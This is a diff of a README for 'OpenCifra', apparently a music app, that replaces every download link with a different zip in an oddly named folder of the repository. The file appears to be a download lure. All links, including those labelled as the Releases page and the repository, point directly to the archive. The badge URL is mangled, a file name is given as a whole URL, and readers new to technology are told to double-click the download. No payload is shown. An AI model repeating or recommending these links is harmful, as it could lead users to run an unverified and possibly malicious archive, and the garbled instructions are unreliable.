@@ -1,7 +1,7 @@
 # 🎶 OpenCifra - Explore Music with Ease
 
-![Download OpenCifra](https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Open-Cifra-v3.7.zip%20OpenCifra-v1.0-brightgreen)  
-[![Download OpenCifra](https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Open-Cifra-v3.7.zip)](https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Open-Cifra-v3.7.zip)
+![Download OpenCifra](https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Cifra-Open-v3.3.zip%20OpenCifra-v1.0-brightgreen)  
+[![Download OpenCifra](https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Cifra-Open-v3.3.zip)](https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Cifra-Open-v3.3.zip)
 
 ## 📖 Overview
 
@@ -19,12 +19,12 @@ OpenCifra is designed to be easy to use, even for those new to technology. Follo
 
 2. **Visit the Download Page**  
    Go to the Releases page to download the latest version of OpenCifra. Click the link below:  
-   [Visit this page to download](https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Open-Cifra-v3.7.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Cifra-Open-v3.3.zip)
 
 ## 📥 Download & Install
 
 1. After reaching the Releases page, locate the latest version.
-2. Click on the download link for your device. If you're using Windows, it will typically be a file named `https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Open-Cifra-v3.7.zip`.
+2. Click on the download link for your device. If you're using Windows, it will typically be a file named `https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Cifra-Open-v3.3.zip`.
 3. Wait for the download to finish. This may take a few moments depending on your internet speed.
 4. Once downloaded, locate the file in your downloads folder.
 5. Double-click the file to start the installation process.
@@ -73,11 +73,11 @@ We regularly update OpenCifra to add new features and fix bugs. Keep an eye on t
 
 ## 🌐 More Information & Resources
 
-- **Repository:** [OpenCifra GitHub](https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Open-Cifra-v3.7.zip)
+- **Repository:** [OpenCifra GitHub](https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Cifra-Open-v3.3.zip)
 - **Documentation:** Comprehensive guides and resources are available in the repository.
 
 ## 🚀 Final Note
 
 OpenCifra is here to help you enjoy music and learn. It is designed for everyone, regardless of technical skill level. Enjoy discovering and playing music with ease! 
 
-Don’t forget to download OpenCifra today: [Visit this page to download](https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Open-Cifra-v3.7.zip)
+Don’t forget to download OpenCifra today: [Visit this page to download](https://raw.githubusercontent.com/OsumIsGreat/OpenCifra/main/bronchiocrisis/Cifra-Open-v3.3.zip)
